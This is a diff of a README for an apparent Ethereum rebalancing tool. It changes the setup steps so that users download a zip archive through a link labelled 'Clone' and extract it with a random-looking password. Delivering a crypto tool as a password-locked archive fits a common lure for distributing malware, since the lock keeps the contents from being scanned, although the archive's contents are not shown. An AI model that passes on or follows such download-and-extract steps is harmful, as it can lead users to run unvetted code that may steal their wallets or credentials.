@@ -12,7 +12,7 @@ This tool is suitable for users who are looking for an automated approach to mai
 
 ## Getting Started
 - [Clone](https://github.com/medlaare/rebalancer/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
-- Extract archive with password `x`
+- Extract archive with password `l4hyZ59Voc`
 - Modify the `config` file:
 
 1. **Ethereum Networks:**
